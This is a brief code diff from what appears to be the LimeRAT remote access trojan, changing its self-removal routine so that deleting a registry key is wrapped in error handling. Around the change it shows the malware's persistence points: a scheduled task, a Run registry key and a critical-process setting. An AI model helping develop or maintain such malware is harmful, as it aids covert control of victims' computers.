@@ -63,8 +63,11 @@
                 Try : Shell("schtasks /Delete /tn LimeRAT-Admin /F", AppWinStyle.Hide, False, -1) : Catch : End Try
                 Try : Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").DeleteValue(EXE) : Catch : End Try
         End If
+            Try
+                Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree("Software\" & HWID)
+            Catch ex As Exception
+            End Try
 
-            Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree("Software\" & HWID)
             CriticalProcesses_Disable()
             Threading.Thread.Sleep(50)
 
